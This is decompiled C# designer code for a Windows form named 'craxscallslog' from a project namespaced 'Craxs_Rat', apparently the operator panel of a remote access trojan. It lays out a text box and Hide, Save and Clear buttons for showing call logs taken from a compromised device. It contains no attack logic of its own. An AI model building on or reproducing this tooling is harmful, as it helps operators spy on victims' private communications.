namespace Craxs_Rat
{
	// Token: 0x02000021 RID: 33
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class craxscallslog : global::System.Windows.Forms.Form
	{
		// Token: 0x06000206 RID: 518 RVA: 0x00010A34 File Offset: 0x0000EC34
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000207 RID: 519 RVA: 0x00010A78 File Offset: 0x0000EC78
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Craxs_Rat.craxscallslog));
			this.callstext = new global::System.Windows.Forms.TextBox();
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.DrakeUIButtonIcon2 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.DrakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.checkbutton = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.Panel5 = new global::System.Windows.Forms.Panel();
			this.Panel4 = new global::System.Windows.Forms.Panel();
			this.Panel3 = new global::System.Windows.Forms.Panel();
			this.Panel2 = new global::System.Windows.Forms.Panel();
			this.ToolTips = new global::DrakeUI.Framework.DrakeUIToolTip(this.components);
			this.Panel1.SuspendLayout();
			this.Panel5.SuspendLayout();
			base.SuspendLayout();
			this.callstext.BackColor = global::System.Drawing.Color.Black;
			this.callstext.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.callstext.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.callstext.Font = new global::System.Drawing.Font("Roboto", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.callstext.ForeColor = global::System.Drawing.Color.White;
			this.callstext.Location = new global::System.Drawing.Point(0, 0);
			this.callstext.Margin = new global::System.Windows.Forms.Padding(4);
			this.callstext.Multiline = true;
			this.callstext.Name = "callstext";
			this.callstext.ScrollBars = global::System.Windows.Forms.ScrollBars.Vertical;
			this.callstext.Size = new global::System.Drawing.Size(453, 266);
			this.callstext.TabIndex = 2;
			this.Panel1.BackColor = global::System.Drawing.Color.Transparent;
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
			this.Panel1.Controls.Add(this.checkbutton);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(487, 133);
			this.Panel1.TabIndex = 5;
			this.DrakeUIButtonIcon2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon2.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.DrakeUIButtonIcon2.Location = new global::System.Drawing.Point(320, 96);
			this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
			this.DrakeUIButtonIcon2.Radius = 15;
			this.DrakeUIButtonIcon2.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon2.Size = new global::System.Drawing.Size(72, 30);
			this.DrakeUIButtonIcon2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon2.Symbol = 61544;
			this.DrakeUIButtonIcon2.TabIndex = 3;
			this.ToolTips.SetToolTip(this.DrakeUIButtonIcon2, "Hide");
			this.DrakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon1.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.DrakeUIButtonIcon1.Location = new global::System.Drawing.Point(242, 96);
			this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
			this.DrakeUIButtonIcon1.Radius = 15;
			this.DrakeUIButtonIcon1.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon1.Size = new global::System.Drawing.Size(72, 30);
			this.DrakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon1.StyleCustomMode = true;
			this.DrakeUIButtonIcon1.Symbol = 61639;
			this.DrakeUIButtonIcon1.TabIndex = 2;
			this.ToolTips.SetToolTip(this.DrakeUIButtonIcon1, "Save");
			this.checkbutton.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.checkbutton.FillColor = global::System.Drawing.Color.Black;
			this.checkbutton.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.checkbutton.Location = new global::System.Drawing.Point(398, 96);
			this.checkbutton.Name = "checkbutton";
			this.checkbutton.Radius = 15;
			this.checkbutton.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.checkbutton.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.checkbutton.Size = new global::System.Drawing.Size(72, 30);
			this.checkbutton.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.checkbutton.Symbol = 61453;
			this.checkbutton.TabIndex = 1;
			this.ToolTips.SetToolTip(this.checkbutton, "Clear & Close");
			this.Panel5.BackColor = global::System.Drawing.Color.Black;
			this.Panel5.Controls.Add(this.callstext);
			this.Panel5.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Panel5.Location = new global::System.Drawing.Point(17, 133);
			this.Panel5.Name = "Panel5";
			this.Panel5.Size = new global::System.Drawing.Size(453, 266);
			this.Panel5.TabIndex = 9;
			this.Panel4.BackColor = global::System.Drawing.Color.Transparent;
			this.Panel4.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Panel4.Location = new global::System.Drawing.Point(17, 399);
			this.Panel4.Name = "Panel4";
			this.Panel4.Size = new global::System.Drawing.Size(453, 21);
			this.Panel4.TabIndex = 8;
			this.Panel3.BackColor = global::System.Drawing.Color.Transparent;
			this.Panel3.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.Panel3.Location = new global::System.Drawing.Point(470, 133);
			this.Panel3.Name = "Panel3";
			this.Panel3.Size = new global::System.Drawing.Size(17, 287);
			this.Panel3.TabIndex = 7;
			this.Panel2.BackColor = global::System.Drawing.Color.Transparent;
			this.Panel2.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.Panel2.Location = new global::System.Drawing.Point(0, 133);
			this.Panel2.Name = "Panel2";
			this.Panel2.Size = new global::System.Drawing.Size(17, 287);
			this.Panel2.TabIndex = 6;
			this.ToolTips.BackColor = global::System.Drawing.Color.Black;
			this.ToolTips.ForeColor = global::System.Drawing.Color.White;
			this.ToolTips.OwnerDraw = true;
			this.ToolTips.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(8f, 16f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.DarkRed;
			this.BackgroundImage = (global::System.Drawing.Image)componentResourceManager.GetObject("$this.BackgroundImage");
			this.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Zoom;
			base.ClientSize = new global::System.Drawing.Size(487, 420);
			base.Controls.Add(this.Panel5);
			base.Controls.Add(this.Panel4);
			base.Controls.Add(this.Panel3);
			base.Controls.Add(this.Panel2);
			base.Controls.Add(this.Panel1);
			this.DoubleBuffered = true;
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Name = "craxscallslog";
			this.Text = "craxscallslog";
			this.Panel1.ResumeLayout(false);
			this.Panel5.ResumeLayout(false);
			this.Panel5.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x04000072 RID: 114
		private global::System.ComponentModel.Container components;
	}
}
